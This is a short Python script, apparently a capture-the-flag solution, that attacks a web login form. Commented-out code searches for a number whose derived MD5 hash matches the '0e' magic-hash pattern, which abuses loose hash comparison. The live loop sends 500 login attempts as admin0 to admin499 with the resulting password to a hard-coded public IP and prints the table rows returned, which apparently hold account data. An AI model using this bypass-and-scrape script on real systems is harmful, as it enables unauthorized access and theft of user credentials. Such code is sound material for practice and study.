import hashlib
import requests
import re
from bs4 import BeautifulSoup


# Function to calculate MD5 hash for a given string
def calculate_md5(input_string):
    md5_hash = hashlib.md5()
    md5_hash.update(input_string.encode("utf-8"))
    return md5_hash.hexdigest()


def temp(password):
    return hashlib.md5(str(2 * 2 * 13 * 13 * int(password)).encode()).hexdigest()


# answer = 0
# print(answer)
# i = 0
# pattern = r"^0+e\d+$"
# md5_result = temp(i)
# while md5_result != answer:
# i = i + 1
# md5_result = temp(i)
# if re.match(pattern, md5_result):
# print(f"{i} Matched!")
# break

# Define the URL
# url = "http://0.0.0.0:8000/"
url = "http://34.132.132.69:8000/"
#
for i in range(500):
    username = f"admin{i}"
    passwd = 355933
    data = {"username": f"{username}", "password": f"{passwd}"}
    response = requests.post(url, data)
    # items = []
    # response = requests.get(url, {"user": "all"})
    # print(response.content)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        # table = soup.find("table")
        # if table:
        # for row in table.find_all("tr"):
        for row in soup.find_all("tr"):
            columns = row.find_all(["td", "th"])
            values = [column.text.strip() for column in columns]
            print(values)
            # items.append(values[1:])
# items = items[1:]
# print(items)
# for item in items:
# data = {"username": f"{item[0]}", "password": f"{item[1]}"}
